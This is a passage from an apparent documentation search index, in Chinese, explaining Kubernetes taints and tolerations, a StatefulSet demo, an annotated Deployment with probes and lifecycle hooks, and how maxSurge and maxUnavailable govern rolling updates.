\u5982\u679c\u8282\u70b9\u4e0a\u5b58\u5728\u6c61\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u4e0d\u4f1a\u63a5\u53d7\u4efb\u4f55\u4e0d\u80fd\u5bb9\u5fcd\uff08tolerate\uff09\u8be5\u6c61\u70b9\u7684 Pod\u3002","title":"\u6c61\u70b9\u548c\u5bb9\u5fcd"},{"location":"lxc/kubernetes/stain/#_2","text":"\u6267\u884c kubectl taint \u547d\u4ee4\uff0c\u53ef\u5411\u8282\u70b9\u6dfb\u52a0\u6c61\u70b9\uff0c\u5982\u4e0b\u6240\u793a\uff1a kubectl taint nodes node1 key=value:NoSchedule \u8be5\u547d\u4ee4\u4e3a\u8282\u70b9 node1 \u6dfb\u52a0\u4e86\u4e00\u4e2a\u6c61\u70b9\u3002\u6c61\u70b9\u662f\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u5728\u672c\u4f8b\u4e2d\uff0c\u6c61\u70b9\u7684\u952e\u4e3a key \uff0c\u503c\u4e3a value \uff0c\u6c61\u70b9\u6548\u679c\u4e3a NoSchedule \u3002\u6b64\u6c61\u70b9\u610f\u5473\u7740 Kubernetes \u4e0d\u4f1a\u5411\u8be5\u8282\u70b9\u8c03\u5ea6\u4efb\u4f55 Pod\uff0c\u9664\u975e\u8be5 Pod \u6709\u4e00\u4e2a\u5339\u914d\u7684\u5bb9\u5fcd\uff08toleration\uff09 \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u5c06\u672c\u4f8b\u4e2d\u7684\u6c61\u70b9\u79fb\u9664\uff1a kubectl taint nodes node1 key:NoSchedule- \u8bbe\u7f6e\u6c61\u70b9\uff1a kubectl taint node [node] key=value[effect] \u5176\u4e2d[effect] \u53ef\u53d6\u503c\uff1a [ NoSchedule | PreferNoSchedule | NoExecute ] NoSchedule \uff1a\u4e00\u5b9a\u4e0d\u80fd\u88ab\u8c03\u5ea6\u3002 PreferNoSchedule\uff1a\u5c3d\u91cf\u4e0d\u8981\u8c03\u5ea6\u3002 NoExecute\uff1a\u4e0d\u4ec5\u4e0d\u4f1a\u8c03\u5ea6\uff0c\u8fd8\u4f1a\u9a71\u9010Node\u4e0a\u5df2\u6709\u7684Pod\u3002 #\u793a\u4f8b\uff1a kubectl taint node 10.3.1.16 test=16:NoSchedule \u53bb\u9664\u6c61\u70b9\uff1a #\u6bd4\u5982\u8bbe\u7f6e\u6c61\u70b9\uff1a kubectl taint node 10.3.1.16 test=16:NoSchedule kubectl taint node 10.3.1.16 test=16:NoExecute #\u53bb\u9664\u6307\u5b9akey\u53ca\u5176effect\uff1a kubectl taint nodes node_name key:[effect]- #(\u8fd9\u91cc\u7684key\u4e0d\u7528\u6307\u5b9avalue) #\u53bb\u9664\u6307\u5b9akey\u6240\u6709\u7684effect: kubectl taint nodes node_name key- #\u793a\u4f8b\uff1a kubectl taint node 10.3.1.16 test:NoSchedule- kubectl taint node 10.3.1.16 test:NoExecute- kubectl taint node 10.3.1.16 test-","title":"\u5411\u8282\u70b9\u6dfb\u52a0\u6c61\u70b9"},{"location":"lxc/kubernetes/stain/#pod","text":"PodSpec \u4e2d\u6709\u4e00\u4e2a tolerations \u5b57\u6bb5\uff0c\u53ef\u7528\u4e8e\u5411 Pod \u6dfb\u52a0\u5bb9\u5fcd\u3002\u4e0b\u9762\u7684\u4e24\u4e2a\u4f8b\u5b50\u4e2d\u5b9a\u4e49\u7684\u5bb9\u5fcd\u90fd\u53ef\u4ee5\u5339\u914d\u4e0a\u4f8b\u4e2d\u7684\u6c61\u70b9\uff0c\u5305\u542b\u8fd9\u4e9b\u5bb9\u5fcd\u7684 Pod \u4e5f\u90fd\u53ef\u4ee5\u88ab\u8c03\u5ea6\u5230 node1 \u8282\u70b9\u4e0a\uff1a \u5bb9\u5fcd1\uff1a tolerations: - key: \"key\" operator: \"Equal\" value: \"value\" effect: \"NoSchedule\" \u5bb9\u5fcd2\uff1a tolerations: - key: \"key\" operator: \"Exists\" effect: \"NoSchedule\" \u4e0b\u9762\u8fd9\u4e2a Pod \u7684\u4f8b\u5b50\u4e2d\uff0c\u4f7f\u7528\u4e86\u5bb9\u5fcd\uff1a apiVersion: v1 kind: Pod metadata: name: nginx labels: env: test spec: containers: - name: nginx image: nginx imagePullPolicy: IfNotPresent tolerations: - key: \"example-key\" operator: \"Exists\" effect: \"NoSchedule\"","title":"\u5411 Pod \u6dfb\u52a0\u5bb9\u5fcd"},{"location":"lxc/kubernetes/stain/#_3","text":"\u5f53\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\u65f6\uff0cKubernetes \u8ba4\u4e3a\u5bb9\u5fcd\u548c\u6c61\u70b9\u5339\u914d\uff1a \u952e\uff08key\uff09\u76f8\u540c \u6548\u679c\uff08effect\uff09\u76f8\u540c \u6c61\u70b9\u7684 operator \u4e3a\uff1a Exists \uff08\u6b64\u65f6\u6c61\u70b9\u4e2d\u4e0d\u5e94\u8be5\u6307\u5b9a value \uff09 \u6216\u8005 Equal \uff08\u6b64\u65f6\u5bb9\u5fcd\u7684 value \u5e94\u4e0e\u6c61\u70b9\u7684 value \u76f8\u540c\uff09 \u5982\u679c\u4e0d\u6307\u5b9a operator \uff0c\u5219\u5176\u9ed8\u8ba4\u4e3a Equal \u7279\u6b8a\u60c5\u51b5 \u5b58\u5728\u5982\u4e0b\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u5bb9\u5fcd\u4e2d\u672a\u5b9a\u4e49 key \u4f46\u662f\u5b9a\u4e49\u4e86 operator \u4e3a Exists \uff0cKubernetes \u8ba4\u4e3a\u6b64\u5bb9\u5fcd\u5339\u914d\u6240\u6709\u7684\u6c61\u70b9\uff0c\u5982\u4e0b\u6240\u793a\uff1a tolerations: - operator: \"Exists\" \u5bb9\u5fcd\u4e2d\u672a\u5b9a\u4e49 effect \u4f46\u662f\u5b9a\u4e49\u4e86 key \uff0cKubernetes \u8ba4\u4e3a\u6b64\u5bb9\u5fcd\u5339\u914d\u6240\u6709 effect \uff0c\u5982\u4e0b\u6240\u793a\uff1a tolerations: - key: \"key\" operator: \"Exists\" \u4e00\u4e2a\u8282\u70b9\u4e0a\u53ef\u4ee5\u6709\u591a\u4e2a\u6c61\u70b9\uff0c\u540c\u65f6\u4e00\u4e2a Pod \u4e0a\u53ef\u4ee5\u6709\u591a\u4e2a\u5bb9\u5fcd\u3002Kubernetes \u4f7f\u7528\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u8fc7\u6ee4\u5668\u7684\u65b9\u6cd5\u6765\u5904\u7406\u591a\u4e2a\u8282\u70b9\u548c\u5bb9\u5fcd\uff1a \u5bf9\u4e8e\u8282\u70b9\u7684\u6240\u6709\u6c61\u70b9\uff0c\u68c0\u67e5 Pod \u4e0a\u662f\u5426\u6709\u5339\u914d\u7684\u5bb9\u5fcd\uff0c\u5982\u679c\u5b58\u5728\u5339\u914d\u7684\u5bb9\u5fcd\uff0c\u5219\u5ffd\u7565\u8be5\u6c61\u70b9\uff1b \u5269\u4e0b\u7684\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5c06\u5bf9\u8be5 Pod \u8d77\u4f5c\u7528 \u4f8b\u5982\uff1a \u5982\u679c\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoSchedule \uff0c\u5219 Kubernetes \u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a \u5982\u679c\u6ca1\u6709\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoSchedule \uff0c\u4f46\u662f\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a\u4e0d\u53ef\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c PreferNoSchedule \uff0c\u5219 Kubernetes \u5c06\u5c3d\u91cf\u907f\u514d\u5c06\u8be5 Pod \u8c03\u5ea6\u5230\u6b64\u8282\u70b9 \u5982\u679c\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u5ffd\u7565\u7684\u6c61\u70b9\u5e26\u6709\u6548\u679c NoExecute \uff0c\u5219\uff1a \u5047\u8bbe Pod \u5df2\u7ecf\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\uff0cKubernetes \u5c06\u4ece\u8be5\u8282\u70b9\u4e0a\u9a71\u9010\uff08evict\uff09\u8be5 Pod \u5047\u8bbe Pod \u5c1a\u672a\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\uff0cKubernetes \u5c06\u4e0d\u4f1a\u628a Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9 \u4f8b\u5982\uff0c\u5047\u8bbe\u60a8\u7ed9\u4e00\u4e2a\u8282\u70b9\u6dfb\u52a0\u4e86\u4e09\u4e2a\u6c61\u70b9\uff1a kubectl taint nodes node1 key1=value1:NoSchedule kubectl taint nodes node1 key1=value1:NoExecute kubectl taint nodes node1 key2=value2:NoSchedule \u540c\u65f6\uff0c\u6709\u4e00\u4e2a Pod \u5e26\u6709\u4e24\u4e2a\u5bb9\u5fcd\uff1a tolerations: - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoSchedule\" - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoExecute\" \u5728\u8fd9\u4e2a\u6848\u4f8b\u4e2d\uff0cPod \u4e0a\u6709\u4e24\u4e2a\u5bb9\u5fcd\uff0c\u5339\u914d\u4e86\u8282\u70b9\u7684\u524d\u4e24\u4e2a\u6c61\u70b9\uff0c\u53ea\u6709\u8282\u70b9\u7684\u7b2c\u4e09\u4e2a\u6c61\u70b9\u5bf9\u8be5 Pod \u6765\u8bf4\u4e0d\u53ef\u5ffd\u7565\uff0c\u8be5\u6c61\u70b9\u7684\u6548\u679c\u4e3a NoSchedule \uff1a Kubernetes \u4e0d\u4f1a\u5c06\u6b64 Pod \u8c03\u5ea6\u5230\u8be5\u8282\u70b9\u4e0a \u5982\u679c Kubernetes \u5148\u5c06 Pod \u8c03\u5ea6\u5230\u4e86\u8be5\u8282\u70b9\uff0c\u540e\u5411\u8be5\u8282\u70b9\u6dfb\u52a0\u4e86\u7b2c\u4e09\u4e2a\u6c61\u70b9\uff0c\u5219 Pod \u5c06\u7ee7\u7eed\u5728\u8be5\u8282\u70b9\u4e0a\u8fd0\u884c\u800c\u4e0d\u4f1a\u88ab\u9a71\u9010\uff08\u8282\u70b9\u4e0a\u5e26\u6709 NoExecute \u6548\u679c\u7684\u6c61\u70b9\u5df2\u88ab Pod \u4e0a\u7684\u7b2c\u4e8c\u4e2a\u5bb9\u5fcd\u5339\u914d\uff0c\u56e0\u6b64\u88ab\u5ffd\u7565\uff09 \u901a\u5e38\uff0c\u5728\u5e26\u6709\u6548\u679c NoExecute \u7684\u6c61\u70b9\u88ab\u6dfb\u52a0\u5230\u8282\u70b9\u65f6\uff0c\u8282\u70b9\u4e0a\u4efb\u4f55\u4e0d\u5bb9\u5fcd\u8be5\u6c61\u70b9\u7684 Pod \u5c06\u88ab\u7acb\u523b\u9a71\u9010\uff0c\u800c\u5bb9\u5fcd\u8be5\u6c61\u70b9\u7684 Pod \u5219\u4e0d\u4f1a\u88ab\u9a71\u9010\u3002 \u6b64\u5916\uff0c\u5e26\u6709\u6548\u679c NoExecute \u7684\u6c61\u70b9\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u53ef\u9009\u5b57\u6bb5 tolerationSeconds \uff0c\u8be5\u5b57\u6bb5\u6307\u5b9a\u4e86 Pod \u5728\u591a\u957f\u65f6\u95f4\u540e\u88ab\u9a71\u9010\uff0c\u4f8b\u5982\uff1a tolerations: - key: \"key1\" operator: \"Equal\" value: \"value1\" effect: \"NoExecute\" tolerationSeconds: 3600 \u6b64\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c Pod \u5df2\u7ecf\u8fd0\u884c\u5728\u8282\u70b9\u4e0a\uff0c\u518d\u5411\u8282\u70b9\u589e\u52a0\u6b64\u6c61\u70b9\u65f6\uff0cPod \u5c06\u5728\u8be5\u8282\u70b9\u4e0a\u7ee7\u7eed\u8fd0\u884c 3600 \u79d2\uff0c\u7136\u540e\u624d\u88ab\u9a71\u9010\u3002\u5982\u679c\u6c61\u70b9\u5728\u6b64\u4e4b\u95f4\u88ab\u79fb\u9664\uff0c\u5219 Pod \u5c06\u4e0d\u4f1a\u88ab\u9a71\u9010\u3002","title":"\u6c61\u70b9\u4e0e\u5bb9\u5fcd\u7684\u5339\u914d"},{"location":"lxc/kubernetes/statefulset/","text":"StatefulSet Demo apiVersion: apps/v1 kind: StatefulSet metadata: name: infra-nginx namespace: default labels: app: infra-nginx version: infra-nginx-uat-podname spec: serviceName: \"infra-nginx\" replicas: 2 selector: matchLabels: app: infra-nginx template: metadata: labels: app: infra-nginx version: infra-nginx-uat-podname spec: containers: - image: nginx name: nginx volumeMounts: - mountPath: /yun name: volume volumes: - name: volume hostPath: path: /yun affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - infra-nginx topologyKey: kubernetes.io/hostname weight: 100 [root@VM-0-16-centos ~]# kubectl get pod NAME READY STATUS RESTARTS AGE infra-nginx-0 1/1 Running 0 21m infra-nginx-1 1/1 Running 0 21m","title":"statefulset\u7684demo"},{"location":"lxc/kubernetes/%E4%B8%80%E4%B8%AA%E5%AE%8C%E6%95%B4%E7%9A%84deployment/","text":"\u4ee5\u4e0b\u662f\u4e00\u4e2a\u8f83\u4e3a\u4e30\u5bcc\u4e14\u5305\u542b\u5b8c\u6574\u751f\u547d\u5468\u671f\u94a9\u5b50\u7684Kubernetes Deployment\u793a\u4f8b\u3002\u8fd9\u4e2a\u793a\u4f8b\u5c55\u793a\u4e86\u4e00\u4e2a\u5e26\u6709\u521d\u59cb\u5316\u5bb9\u5668\uff08 initContainers \uff09\u3001\u751f\u547d\u5468\u671f\u94a9\u5b50\uff08 lifecycle \uff09\u3001\u5c31\u7eea\u63a2\u9488\uff08 readinessProbe \uff09\u548c\u5b58\u6d3b\u63a2\u9488\uff08 livenessProbe \uff09\u7684Deployment\u3002 apiVersion: apps/v1 kind: Deployment metadata: name: example-deployment spec: replicas: 3 selector: matchLabels: app: example template: metadata: labels: app: example spec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: high-memory operator: In values: - \"true\" initContainers: - name: init-myservice image: busybox:1.28 command: ['sh', '-c', 'echo \"Init Container doing some work\" && sleep 60'] containers: - name: main-container image: nginx:1.17.1 ports: - containerPort: 80 lifecycle: postStart: exec: command: [\"/bin/sh\", \"-c\", \"echo 'PostStart Hook: Container started'\"] preStop: exec: command: [\"/bin/sh\", \"-c\", \"echo 'PreStop Hook: Container stopping' && sleep 10\"] readinessProbe: httpGet: path: /index.html port: 80 initialDelaySeconds: 15 periodSeconds: 10 livenessProbe: httpGet: path: /index.html port: 80 initialDelaySeconds: 20 periodSeconds: 10 restartPolicy: Always Kubernetes Deployment \u914d\u7f6e\u7684\u9010\u884c\u89e3\u91ca\uff1a apiVersion: apps/v1 - apiVersion : \u6307\u5b9a\u4e86\u4f7f\u7528\u7684 Kubernetes API \u7248\u672c\uff0c\u8fd9\u91cc\u662f apps/v1 \uff0c\u9002\u7528\u4e8e Deployment \u8d44\u6e90\u7c7b\u578b\u3002 kind: Deployment - kind : \u5b9a\u4e49\u4e86\u8d44\u6e90\u7c7b\u578b\uff0c\u8fd9\u91cc\u662f Deployment \uff0c\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u90e8\u7f72\u5bf9\u8c61\u3002 metadata: name: example-deployment - metadata : \u63d0\u4f9b\u4e86\u5173\u4e8e\u8d44\u6e90\u7684\u5143\u6570\u636e\u3002 - name : \u8d44\u6e90\u7684\u540d\u79f0\uff0c\u8fd9\u91cc\u662f example-deployment \u3002 spec: replicas: 3 - spec : \u5b9a\u4e49\u4e86\u90e8\u7f72\u7684\u8be6\u7ec6\u89c4\u683c\u3002 - replicas : \u6307\u5b9a\u4e86\u5e94\u8be5\u8fd0\u884c\u7684 Pod \u526f\u672c\u6570\u91cf\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u4e3a3\u3002 selector: matchLabels: app: example - selector : \u5b9a\u4e49\u4e86\u5982\u4f55\u9009\u62e9 Pod\uff0c\u7528\u4e8e\u786e\u5b9a\u54ea\u4e9b Pod \u5c5e\u4e8e\u8fd9\u4e2a Deployment\u3002 - matchLabels : \u8bbe\u7f6e\u4e86\u9009\u62e9\u6807\u51c6\uff0c\u8fd9\u91cc\u662f\u9009\u62e9\u5e26\u6709 app: example \u6807\u7b7e\u7684 Pod\u3002 template: metadata: labels: app: example - template : \u5b9a\u4e49\u4e86 Pod \u7684\u6a21\u677f\u3002 - metadata : \u6a21\u677f\u7684\u5143\u6570\u636e\u3002 - labels : \u8bbe\u7f6e\u4e86 Pod \u7684\u6807\u7b7e\uff0c\u8fd9\u91cc\u4e3a app: example \u3002 spec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: high-memory operator: In values: - \"true\" - affinity : \u5b9a\u4e49\u4e86 Pod \u4e0e\u8282\u70b9\u7684\u4eb2\u548c\u6027\u8bbe\u7f6e\u3002 - nodeAffinity : \u8bbe\u7f6e\u4e86\u8282\u70b9\u4eb2\u548c\u6027\u89c4\u5219\u3002 - preferredDuringSchedulingIgnoredDuringExecution : \u8868\u660e\u8fd9\u662f\u4e00\u4e2a\u4f18\u5148\u7ea7\u89c4\u5219\uff0c\u4e0d\u662f\u5f3a\u5236\u6027\u7684\u3002 - weight : \u4e3a\u8fd9\u4e2a\u89c4\u5219\u8bbe\u7f6e\u4e86\u6743\u91cd\uff0c\u8fd9\u91cc\u662f1\u3002 - preference : \u5b9a\u4e49\u4e86\u5339\u914d\u8868\u8fbe\u5f0f\u3002 - matchExpressions : \u8bbe\u7f6e\u4e86\u8282\u70b9\u9009\u62e9\u6761\u4ef6\u3002 - key : \u8282\u70b9\u6807\u7b7e\u7684\u952e\uff0c\u8fd9\u91cc\u662f high-memory \u3002 - operator : \u64cd\u4f5c\u7b26\uff0c\u8fd9\u91cc\u662f In \uff0c\u8868\u793a\u8282\u70b9\u6807\u7b7e\u7684\u503c\u5e94\u8be5\u5728\u4e0b\u9762\u7684\u5217\u8868\u4e2d\u3002 - values : \u503c\u7684\u5217\u8868\uff0c\u8fd9\u91cc\u662f \"true\" \u3002 initContainers: - name: init-myservice image: busybox:1.28 command: ['sh', '-c', 'echo \"Init Container doing some work\" && sleep 60'] - initContainers : \u5b9a\u4e49\u4e86\u521d\u59cb\u5316\u5bb9\u5668\u3002 - name : \u521d\u59cb\u5316\u5bb9\u5668\u7684\u540d\u79f0\uff0c\u8fd9\u91cc\u662f init-myservice \u3002 - image : \u5bb9\u5668\u4f7f\u7528\u7684\u955c\u50cf\uff0c\u8fd9\u91cc\u662f busybox:1.28 \u3002 - command : \u5bb9\u5668\u542f\u52a8\u65f6\u6267\u884c\u7684\u547d\u4ee4\u3002 containers: - name: main-container image: nginx:1.17.1 ports: - containerPort: 80 - containers : \u5b9a\u4e49\u4e86\u5e94\u7528\u5bb9\u5668\u3002 - name : \u5bb9\u5668\u7684\u540d\u79f0\uff0c\u8fd9\u91cc\u662f main-container \u3002 - image : \u5bb9\u5668\u4f7f\u7528\u7684\u955c\u50cf\uff0c\u8fd9\u91cc\u662f nginx:1.17.1 \u3002 - ports : \u5bb9\u5668\u66b4\u9732\u7684\u7aef\u53e3\u3002 - containerPort : \u6307\u5b9a\u5bb9\u5668\u5185\u90e8\u76d1\u542c\u7684\u7aef\u53e3\u53f7\uff0c\u8fd9\u91cc\u662f80\u3002 lifecycle: postStart: exec: command: [\"/bin/sh\", \"-c\", \"echo 'PostStart Hook: Container started'\"] preStop: exec: command: [\"/bin/sh\", \"-c\", \"echo 'PreStop Hook: Container stopping' && sleep 10\"] - lifecycle : \u5b9a\u4e49\u4e86\u5bb9\u5668\u751f\u547d\u5468\u671f\u7684\u94a9\u5b50\u3002 - postStart : \u5bb9\u5668\u542f\u52a8\u540e\u6267\u884c\u7684\u547d\u4ee4\u3002 - preStop : \u5bb9\u5668\u505c\u6b62\u524d\u6267\u884c\u7684\u547d\u4ee4\u3002 readinessProbe: httpGet: path: /index.html port: 80 initialDelay Seconds: 15 periodSeconds: 10 - readinessProbe : \u5b9a\u4e49\u4e86\u5c31\u7eea\u63a2\u9488\u3002 - httpGet : \u901a\u8fc7HTTP GET\u8bf7\u6c42\u68c0\u67e5\u5bb9\u5668\u662f\u5426\u51c6\u5907\u597d\u670d\u52a1\u3002 - path \u548c port : \u6307\u5b9a\u4e86\u68c0\u67e5\u7684\u8def\u5f84\u548c\u7aef\u53e3\u3002 - initialDelaySeconds : \u5bb9\u5668\u542f\u52a8\u540e\u5ef6\u8fdf\u591a\u4e45\u5f00\u59cb\u63a2\u9488\u3002 - periodSeconds : \u63a2\u9488\u7684\u68c0\u67e5\u9891\u7387\u3002 livenessProbe: httpGet: path: /index.html port: 80 initialDelaySeconds: 20 periodSeconds: 10 - livenessProbe : \u5b9a\u4e49\u4e86\u5b58\u6d3b\u63a2\u9488\u3002 - \u7c7b\u4f3c\u4e8e readinessProbe \uff0c\u7528\u4e8e\u68c0\u67e5\u5bb9\u5668\u662f\u5426\u8fd8\u5728\u8fd0\u884c\u3002 restartPolicy: Always - restartPolicy : \u5b9a\u4e49\u4e86 Pod \u7684\u91cd\u542f\u7b56\u7565\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u4e3a Always \uff0c\u610f\u5473\u7740\u603b\u662f\u91cd\u542f\u5931\u8d25\u7684\u5bb9\u5668\u3002 \u8fd9\u4e2a\u914d\u7f6e\u4e3a Kubernetes \u90e8\u7f72\u63d0\u4f9b\u4e86\u4e00\u4e2a\u8be6\u7ec6\u7684\u8bbe\u7f6e\uff0c\u5305\u62ec\u8282\u70b9\u4eb2\u548c\u6027\u3001\u521d\u59cb\u5316\u5bb9\u5668\u3001\u5bb9\u5668\u751f\u547d\u5468\u671f\u94a9\u5b50\u4ee5\u53ca\u63a2\u9488\u6765\u786e\u4fdd\u5bb9\u5668\u7684\u5065\u5eb7\u548c\u6b63\u786e\u542f\u52a8\u3002","title":"\u4e00\u4e2a\u6bd4\u8f83\u5b8c\u6574\u7684deployment\u7684\u6837\u4f8b"},{"location":"lxc/kubernetes/%E6%BB%9A%E5%8A%A8%E5%8D%87%E7%BA%A7%E4%B8%AD%E7%9A%84maxSurge%E5%92%8CmaxUnavailable/","text":"\u5982\u679c\u6b63\u786e\u914d\u7f6e\u4e86 Health Check\uff0c\u65b0\u526f\u672c\u53ea\u6709\u901a\u8fc7\u4e86 Readiness \u63a2\u6d4b\uff0c\u624d\u4f1a\u88ab\u6dfb\u52a0\u5230 Service\uff1b\u5982\u679c\u6ca1\u6709\u901a\u8fc7\u63a2\u6d4b\uff0c\u73b0\u6709\u526f\u672c\u4e0d\u4f1a\u88ab\u5168\u90e8\u66ff\u6362\uff0c\u4e1a\u52a1\u4ecd\u7136\u6b63\u5e38\u8fdb\u884c\u3002 \u4e0b\u9762\u901a\u8fc7\u4f8b\u5b50\u6765\u5b9e\u8df5 Health Check \u5728 Rolling Update \u4e2d\u7684\u5e94\u7528\u3002 \u7528\u5982\u4e0b\u914d\u7f6e\u6587\u4ef6 app.v1.yml \u6a21\u62df\u4e00\u4e2a 10 \u526f\u672c\u7684\u5e94\u7528\uff1a apiVersion: apps/v1beta1 kind: Deployment metadata: name: app spec: replicas: 10 template: metadata: labels: run: app spec: containers: - name: app image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 10 \u79d2\u540e\u526f\u672c\u80fd\u591f\u901a\u8fc7 Readiness \u63a2\u6d4b\u3002 \u63a5\u4e0b\u6765\u6eda\u52a8\u66f4\u65b0\u5e94\u7528\uff0c\u914d\u7f6e\u6587\u4ef6 app.v2.yml \u5982\u4e0b\uff1a apiVersion: apps/v1beta1 kind: Deployment metadata: name: app spec: replicas: 10 template: metadata: labels: run: app spec: containers: - name: app image: busybox args: - /bin/sh - -c - sleep 3000 readinessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 periodSeconds: 5 \u5f88\u663e\u7136\uff0c\u7531\u4e8e\u65b0\u526f\u672c\u4e2d\u4e0d\u5b58\u5728 /tmp/healthy\uff0c\u662f\u65e0\u6cd5\u901a\u8fc7 Readiness \u63a2\u6d4b\u7684\u3002\u9a8c\u8bc1\u5982\u4e0b\uff1a \u8fd9\u4e2a\u622a\u56fe\u5305\u542b\u4e86\u5927\u91cf\u7684\u4fe1\u606f\uff0c\u503c\u5f97\u6211\u4eec\u8be6\u7ec6\u5206\u6790\u3002 \u5148\u5173\u6ce8 kubectl get pod \u8f93\u51fa\uff1a \u4ece Pod \u7684 AGE \u680f\u53ef\u5224\u65ad\uff0c\u6700\u540e 5 \u4e2a Pod \u662f\u65b0\u526f\u672c\uff0c\u76ee\u524d\u5904\u4e8e NOT READY \u72b6\u6001\u3002 \u65e7\u526f\u672c\u4ece\u6700\u521d 10 \u4e2a\u51cf\u5c11\u5230 8 \u4e2a\u3002 \u518d\u6765\u770b kubectl get deployment app \u7684\u8f93\u51fa\uff1a 1. DESIRED 10 \u8868\u793a\u671f\u671b\u7684\u72b6\u6001\u662f 10 \u4e2a READY \u7684\u526f\u672c\u3002 CURRENT 13 \u8868\u793a\u5f53\u524d\u526f\u672c\u7684\u603b\u6570\uff1a\u5373 8 \u4e2a\u65e7\u526f\u672c + 5 \u4e2a\u65b0\u526f\u672c\u3002 UP-TO-DATE 5 \u8868\u793a\u5f53\u524d\u5df2\u7ecf\u5b8c\u6210\u66f4\u65b0\u7684\u526f\u672c\u6570\uff1a\u5373 5 \u4e2a\u65b0\u526f\u672c\u3002 AVAILABLE 8 \u8868\u793a\u5f53\u524d\u5904\u4e8e READY \u72b6\u6001\u7684\u526f\u672c\u6570\uff1a\u5373 8\u4e2a\u65e7\u526f\u672c\u3002 \u5728\u6211\u4eec\u7684\u8bbe\u5b9a\u4e2d\uff0c\u65b0\u526f\u672c\u59cb\u7ec8\u90fd\u65e0\u6cd5\u901a\u8fc7 Readiness \u63a2\u6d4b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u72b6\u6001\u4f1a\u4e00\u76f4\u4fdd\u6301\u4e0b\u53bb\u3002 \u4e0a\u9762\u6211\u4eec\u6a21\u62df\u4e86\u4e00\u4e2a\u6eda\u52a8\u66f4\u65b0\u5931\u8d25\u7684\u573a\u666f\u3002\u4e0d\u8fc7\u5e78\u8fd0\u7684\u662f\uff1aHealth Check \u5e2e\u6211\u4eec\u5c4f\u853d\u4e86\u6709\u7f3a\u9677\u7684\u526f\u672c\uff0c\u540c\u65f6\u4fdd\u7559\u4e86\u5927\u90e8\u5206\u65e7\u526f\u672c\uff0c\u4e1a\u52a1\u6ca1\u6709\u56e0\u66f4\u65b0\u5931\u8d25\u53d7\u5230\u5f71\u54cd\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8981\u56de\u7b54\uff1a\u4e3a\u4ec0\u4e48\u65b0\u521b\u5efa\u7684\u526f\u672c\u6570\u662f 5 \u4e2a\uff0c\u540c\u65f6\u53ea\u9500\u6bc1\u4e86 2 \u4e2a\u65e7\u526f\u672c\uff1f \u539f\u56e0\u662f\uff1a\u6eda\u52a8\u66f4\u65b0\u901a\u8fc7\u53c2\u6570 maxSurge \u548c maxUnavailable \u6765\u63a7\u5236\u526f\u672c\u66ff\u6362\u7684\u6570\u91cf\u3002 maxSurge \u6b64\u53c2\u6570\u63a7\u5236\u6eda\u52a8\u66f4\u65b0\u8fc7\u7a0b\u4e2d\u526f\u672c\u603b\u6570\u7684\u8d85\u8fc7 DESIRED \u7684\u4e0a\u9650\u3002maxSurge \u53ef\u4ee5\u662f\u5177\u4f53\u7684\u6574\u6570\uff08\u6bd4\u5982 3\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u767e\u5206\u767e\uff0c\u5411\u4e0a\u53d6\u6574\u3002maxSurge \u9ed8\u8ba4\u503c\u4e3a 25%\u3002 \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cDESIRED \u4e3a 10\uff0c\u90a3\u4e48\u526f\u672c\u603b\u6570\u7684\u6700\u5927\u503c\u4e3a\uff1a roundUp(10 + 10 * 25%) = 13 \u6240\u4ee5\u6211\u4eec\u770b\u5230 CURRENT \u5c31\u662f 13\u3002 maxUnavailable \u6b64\u53c2\u6570\u63a7\u5236\u6eda\u52a8\u66f4\u65b0\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u7528\u7684\u526f\u672c\u76f8\u5360 DESIRED \u7684\u6700\u5927\u6bd4\u4f8b\u3002 maxUnavailable \u53ef\u4ee5\u662f\u5177\u4f53\u7684\u6574\u6570\uff08\u6bd4\u5982 3\uff09\uff0c\u4e5f\u53ef\u4ee5\u662f\u767e\u5206\u767e\uff0c\u5411\u4e0b\u53d6\u6574\u3002maxUnavailable \u9ed8\u8ba4\u503c\u4e3a 25%\u3002 \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0cDESIRED \u4e3a 10\uff0c\u90a3\u4e48\u53ef\u7528\u7684\u526f\u672c\u6570\u81f3\u5c11\u8981\u4e3a\uff1a 10 - roundDown(10 * 